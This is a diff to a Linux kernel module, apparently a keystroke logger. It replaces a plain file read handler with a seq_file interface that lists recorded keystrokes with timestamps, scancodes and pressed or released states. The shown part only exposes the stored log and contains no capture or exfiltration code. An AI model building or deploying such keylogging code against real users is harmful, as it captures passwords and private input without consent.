@@ -188,7 +188,7 @@ static char	*ft_strjoin(char *s1, char *s2)
 	return (new);
 }
 
-
+/*
 static ssize_t long_read(struct file *f, char __user *s, size_t n, loff_t *o)
 {
 	struct s_stroke *tmp;
@@ -219,6 +219,34 @@ out:
 
 struct file_operations kbfops = {
 	.read = long_read
+};
+*/
+
+static int long_read(struct seq_file *m, void *v)
+{
+	struct s_stroke *tmp;
+
+	tmp = stroke_head;
+	while (tmp) {
+		seq_printf(m, "[%d:%d:%d] %s (%s%#x) %s\n", \
+			tmp->time.tm_hour, tmp->time.tm_min, tmp->time.tm_sec, \
+			tmp->name, \
+			tmp->multi ? "0xe0, " : "", tmp->key, \
+			tmp->state ? "pressed" : "released");
+		tmp = tmp->next;
+	}
+	return 0;
+}
+
+static int long_open(struct inode *inode, struct file *f)
+{
+	f->private_data = NULL;
+	return single_open(f, long_read, NULL);
+}
+
+struct file_operations kbfops = {
+	.open = long_open,
+	.read = seq_read
 };
 
 static int __init hello_init(void) {
